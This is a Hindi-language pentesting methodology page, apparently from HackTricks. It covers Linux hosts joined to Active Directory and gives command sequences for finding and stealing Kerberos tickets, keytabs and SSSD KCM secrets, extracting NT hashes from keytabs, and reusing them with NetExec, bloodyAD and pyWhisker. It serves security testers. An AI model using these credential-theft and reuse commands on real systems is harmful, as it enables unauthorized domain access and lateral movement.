# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux मशीन भी Active Directory वातावरण में मौजूद हो सकती है।

AD के अंदर मौजूद Linux मशीन **Kerberos सामग्री को स्थानीय रूप से संग्रहीत कर सकती है**: user ccaches, machine/service keytabs और SSSD-प्रबंधित secrets। आमतौर पर इन artifacts का फिर से इस्तेमाल किसी अन्य Kerberos credential की तरह किया जा सकता है। इनमें से अधिकांश को पढ़ने के लिए आपको उस ticket का user owner या मशीन पर **root** होना होगा।<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### Linux से AD enumeration

यदि आपको Linux (या Windows में bash) पर AD का access है, तो AD enumerate करने के लिए [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) आज़मा सकते हैं।

Linux से AD enumerate करने के **अन्य तरीके** जानने के लिए यह पेज भी देख सकते हैं:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, मुख्य रूप से **Unix** वातावरणों के लिए, Microsoft Windows **Active Directory** का एक open-source **विकल्प** है। यह Active Directory जैसी management के लिए एक पूर्ण **LDAP directory** को MIT **Kerberos** Key Distribution Center के साथ जोड़ता है। CA और RA certificate management के लिए Dogtag **Certificate System** का उपयोग करते हुए, यह smartcards सहित **multi-factor** authentication का समर्थन करता है। Unix authentication प्रक्रियाओं के लिए SSSD एकीकृत है।<sup>[[14]](#references)[[15]](#references)</sup> इसके बारे में और जानें:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artifacts

Tickets को छूने से पहले पता करें कि **host को AD से कैसे जोड़ा गया था** और **Kerberos सामग्री वास्तव में कहाँ संग्रहीत है**। आधुनिक Linux hosts पर यह काम आमतौर पर `realmd` + `adcli` + `sssd` संभालते हैं; सामग्री केवल `/tmp` की साधारण files में नहीं होती।<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

यह जल्दी बताता है कि host AD पर भरोसा करता है या नहीं, SSSD identities या tickets cache कर रहा है या नहीं, और क्या **machine/service keytabs** या **KCM secrets** दुरुपयोग के लिए उपलब्ध हैं।<sup>[[4]](#references)[[10]](#references)</sup>

`/var/lib/sss/db/cache_*.ldb` को Kerberos ccaches और `/var/lib/sss/secrets/secrets.ldb` से अलग मानें। `cache_*.ldb` फ़ाइलों में offline password verifiers हो सकते हैं, जब domain में `cache_credentials = true` हो **और** user ने पहले उस host पर authentication किया हो। इन्हें सामान्यतः केवल privileged access से पढ़ा जा सकता है। केवल cache फ़ाइल या enabled setting से यह साबित नहीं होता कि कोई उपयोगी, मौजूदा password उपलब्ध है; यह निष्कर्ष निकालने से पहले प्रभावी per-domain setting और वास्तव में cached identities की जाँच करें। [Red Hat का SSSD credential-cache दस्तावेज़](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication) देखें। Linux और AD के बीच अलग identity boundary के लिए, [mixed-vendor Kerberos name mapping](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) तभी मायने रखता है, जब कोई service ticket स्वीकार करे और उसके principal को संबंधित Unix account से map करे।

`ksu` वाले host पर, कोई valid Kerberos principal **local target account**, जिसमें root भी शामिल है, तक तभी पहुँच सकता है जब वह account उस principal को authorize करता हो। [MIT Kerberos के दस्तावेज़](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) target के home में मौजूद `.k5login` और `.k5users` फ़ाइलों का वर्णन करते हैं, साथ ही यह भी बताते हैं कि दोनों में से कोई न होने पर name-mapping fallback कैसे काम करता है। `.k5users`, `ksu -e` के लिए commands पर पाबंदी भी लगा सकता है; केवल फ़ाइल का नाम shell access साबित नहीं करता। ठीक उसी target account, फ़ाइल के ownership/permissions और पढ़ी जा सकने वाली authorization entries, उपलब्ध Kerberos credential, और प्रभावी mapping rules की जाँच करें। यदि root home तक पहुँच नहीं है, तो authorization की स्थिति अज्ञात रहती है। Passive enumeration में इन paths और permissions को सूचीबद्ध करें; tickets माँगे बिना या `ksu` चलाए बिना।

Scheduled backup अप्रत्यक्ष रूप से `.k5login` authorization boundary बना सकता है। यदि कोई higher-privileged account, lower-user-writable directory को recursively अपने home में copy करता है, तो जाँचें कि copy में hidden files शामिल हैं, destination path उस account का प्रभावी home है, और बनी हुई फ़ाइल का ownership Kerberos login service द्वारा स्वीकार्य है। उदाहरण के लिए, [rsync के दस्तावेज़](https://download.samba.org/pub/rsync/rsync.1.html) के अनुसार `-a --no-owner` नई destination files का ownership receiving user को देता है। [MIT Kerberos के दस्तावेज़](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) बताते हैं कि उस user की `.k5login` में मौजूद principal access authorize कर सकता है। Scheduled job की RunAs identity, source पर write access, प्रभावी rsync options, GSSAPI-enabled login, और सूचीबद्ध principal के लिए valid ticket की पुष्टि करें; केवल writable source directory या scheduled rsync command से यह path साबित नहीं होता।

Readable keytab की भी principal-विशिष्ट जाँच आवश्यक है। Administration-named principal वाली keytab अपने-आप administrative rights साबित नहीं करती: [KDC की `kadm5.acl` policy](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) तय करती है कि principal को कौन-से operations करने की अनुमति है। Keytab access को root तक पहुँचने का रास्ता मानने से पहले principal, प्रभावी ACL, और local `ksu` या login authorization की अलग-अलग पुष्टि करें। Passive triage में keytab के path और permissions सूचीबद्ध किए जा सकते हैं, बिना उसकी keys इस्तेमाल किए या KDC से संपर्क किए।

## Tickets के साथ प्रयोग

### Pass The Ticket

इस page पर आपको Linux host के अंदर **Kerberos tickets मिलने की अलग-अलग जगहें** मिलेंगी। अगले page पर आप सीख सकते हैं कि इन CCache ticket formats को Kirbi में कैसे बदलें (यह Windows में इस्तेमाल होने वाला format है) और PTT attack कैसे करें:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

यदि आप **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, आदि) चाहते हैं, तो यह dedicated page देखें:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp से CCACHE ticket का पुनः उपयोग

CCACHE files, **Kerberos credentials store करने** के binary formats हैं। `FILE:/tmp/krb5cc_%{uid}` अब भी आम है, लेकिन modern Linux deployments में `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, या `KCM:%{uid}` भी इस्तेमाल होते हैं। यह मानने से पहले कि tickets `/tmp` में हैं, **`KRB5CCNAME`** environment variable और `default_ccache_name` setting जाँचें।<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### keyring से CCACHE ticket का पुनः उपयोग

**किसी process की memory में संग्रहीत Kerberos tickets निकाले जा सकते हैं**, खासकर जब मशीन पर ptrace protection (`/proc/sys/kernel/yama/ptrace_scope`) disabled हो। इस उद्देश्य के लिए एक उपयोगी tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) पर उपलब्ध है। यह sessions में inject करके और tickets को `/tmp` में dump करके उन्हें निकालने में मदद करता है।<sup>[[1]](#references)[[16]](#references)</sup>

इस tool को configure और उपयोग करने के लिए, नीचे दिए गए steps अपनाएँ:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

यह प्रक्रिया विभिन्न sessions में inject करने का प्रयास करेगी। सफलता का संकेत `/tmp` में `__krb_UID.ccache` नामकरण परंपरा के अनुसार निकाले गए tickets को स्टोर करके दिया जाएगा।<sup>[[1]](#references)</sup>

### SSSD KCM से CCACHE ticket का पुनः उपयोग

SSSD डेटाबेस की एक कॉपी `/var/lib/sss/secrets/secrets.ldb` पथ पर रखता है। इससे संबंधित key `/var/lib/sss/secrets/.secrets.mkey` पथ पर hidden file के रूप में स्टोर होती है। डिफ़ॉल्ट रूप से, यह key केवल **root** permissions होने पर ही पढ़ी जा सकती है।<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`** को --database और --key parameters के साथ चलाने पर डेटाबेस parse होगा और **secrets decrypt** हो जाएंगे।<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor raw Kerberos JSON payloads प्रिंट करता है; pass-the-cache/pass-the-ticket operations से पहले उन्हें usable ticket cache या किसी अन्य ticket format में बदलें।<sup>[[4]](#references)</sup>

### त्वरित keytab triage

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### /etc/krb5.keytab से accounts निकालें

root privileges के साथ चलने वाली services के लिए आवश्यक service account keys, **`/etc/krb5.keytab`** files में सुरक्षित रूप से store की जाती हैं। Services के passwords जैसी इन keys को सख्त गोपनीयता में रखना ज़रूरी है।<sup>[[5]](#references)</sup>

Keytab file की contents देखने के लिए **`klist`** का इस्तेमाल किया जा सकता है। Linux पर, `klist -k -K -e` principals, key version numbers, encryption types और raw key material दिखाता है। अगर key type **23 / RC4-HMAC** है, तो key value उस principal का **NT hash** भी होता है।<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Linux उपयोगकर्ताओं के लिए, **`KeyTabExtract`** RC4 HMAC hash निकालने की सुविधा देता है, जिसका उपयोग NTLM hash reuse के लिए किया जा सकता है। ध्यान दें कि यह तभी मददगार है, जब keytab में अब भी **etype 23 / RC4-HMAC** सामग्री हो। **AES-only** वातावरण में आपको पुनः उपयोग योग्य NT hash नहीं मिल सकता, लेकिन फिर भी आप Kerberos के माध्यम से keytab का उपयोग करके सीधे authenticate कर सकते हैं।<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

macOS पर, **`bifrost`** keytab फ़ाइल विश्लेषण के लिए एक टूल के रूप में काम करता है।<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

निकाले गए account और hash की जानकारी का उपयोग करके, **`NetExec`** जैसे tools से servers से connections स्थापित किए जा सकते हैं।<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### `/etc/krb5.keytab` से machine account का पुनः उपयोग

`realmd`/`adcli`/`sssd` से joined systems पर, `/etc/krb5.keytab` में आमतौर पर **computer account** और एक या अधिक **host/service principals** होते हैं। अगर आपके पास **root** है, तो इसे बस dump न करें: `klist -k` में सूचीबद्ध principals में से किसी एक का उपयोग करके TGT का अनुरोध करें और Linux host के रूप में काम करें।<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

यह विशेष रूप से तब उपयोगी होता है जब **computer object** के पास AD में स्वयं delegated अधिकार हों या होस्ट को **gMSA** जैसे अन्य secrets पुनः प्राप्त करने की अनुमति हो।<sup>[[13]](#references)</sup>

### Linux-first AD tooling से चुराई गई Kerberos सामग्री का पुनः उपयोग

एक बार आपके पास मान्य `ccache` या उपयोग करने योग्य keytab हो, तो सब कुछ पहले Windows formats में बदले बिना **सीधे Linux से** AD के विरुद्ध काम कर सकते हैं। कई आधुनिक टूल `KRB5CCNAME` / Kerberos auth को मूल रूप से स्वीकार करते हैं।<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

यह **Linux post-exploitation** और **AD object abuse** के बीच एक अच्छा सेतु है। स्वयं object-level abuse paths के लिए देखें:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account आर्टिफैक्ट्स

हाल के Linux deployments सीधे AD से **Managed Service Accounts** का उपयोग कर सकते हैं। व्यवहार में, इसका अर्थ है कि Linux server से समझौता करने के बाद आपको host keytab के साथ-साथ gMSA से जनरेट किए गए **service-specific keytabs** भी मिल सकते हैं। जाँचने के लिए आम जगहों में `/etc/gmsad.conf`, deployment-specific config files और `/etc` के अंतर्गत अतिरिक्त `*.keytab` files शामिल हैं।<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

इससे आपको उन SPNs के लिए एक दोबारा उपयोग की जा सकने वाली Kerberos पहचान मिलती है जो उस gMSA से जुड़े हैं, **बिना किसी Windows endpoint को छुए**।<sup>[[13]](#references)</sup> AD में उच्चतर privileges मिलने के बाद **domain-side** gMSA/dMSA के दुरुपयोग के लिए देखें:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos पर हमला कैसे करें?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account से AD एक्सेस करना – RHEL systems को सीधे Active Directory के साथ एकीकृत करना](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos environment variables – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Microsoft Windows द्वारा उपयोग किए जाने वाले RC4-HMAC Kerberos Encryption Types](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos का उपयोग करना | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identity Domains की खोज करना और उनसे जुड़ना | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD उपयोगकर्ता गाइड](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [परिचय | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 रिलीज़ नोट्स](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
